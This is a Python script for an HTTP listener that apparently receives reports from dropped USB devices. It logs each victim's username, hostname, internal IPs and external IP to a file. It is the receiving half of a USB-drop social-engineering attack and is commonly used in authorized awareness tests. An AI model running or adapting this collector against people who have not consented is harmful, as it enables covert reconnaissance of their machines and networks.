#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime

PORT = 8080
LOGFILE = "usb_drop_logs.txt"

class USBDropHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(403)
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        boundary = self.headers.get('Content-Type', '').split("boundary=")[-1]
        raw_data = self.rfile.read(content_length).decode(errors="ignore")

        lines = raw_data.splitlines()
        data_lines = []
        in_data = False
        for line in lines:
            if line.startswith("--" + boundary):
                in_data = True
                continue
            elif line.startswith("--") and in_data:
                break
            elif in_data and line.strip() != "":
                data_lines.append(line)

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        whoami = ""
        hostname = ""
        internal_ips = []
        external_ip = ""

        for i, line in enumerate(data_lines):
            if line.strip() == "[WHOAMI]":
                whoami = data_lines[i + 1].strip()
            elif line.strip() == "[HOSTNAME]":
                hostname = data_lines[i + 1].strip()
            elif line.strip() == "[INTERNAL_IP]":
                j = i + 1
                while j < len(data_lines) and data_lines[j].strip() != "[EXTERNAL_IP]":
                    if data_lines[j].strip():
                        internal_ips.append(data_lines[j].strip())
                    j += 1
            elif line.strip() == "[EXTERNAL_IP]":
                external_ip = data_lines[i + 1].strip()

        output_lines = [
            f"\n=== Hit @ {timestamp} ===",
            f"User: {whoami}",
            f"Hostname: {hostname}",
            "Internal IPs:"
        ]
        output_lines.extend(internal_ips)
        output_lines.append(f"External IP Address: {external_ip}")
        result = "\n".join(output_lines) + "\n"

        with open(LOGFILE, "a") as f:
            f.write(result)

        print(result)
        self.send_response(200)
        self.end_headers()

def run():
    print(f"[*] Listening on port {PORT}")
    print(f"[*] Logging to ./{LOGFILE}")
    server = HTTPServer(('', PORT), USBDropHandler)
    server.serve_forever()

if __name__ == "__main__":
    run()
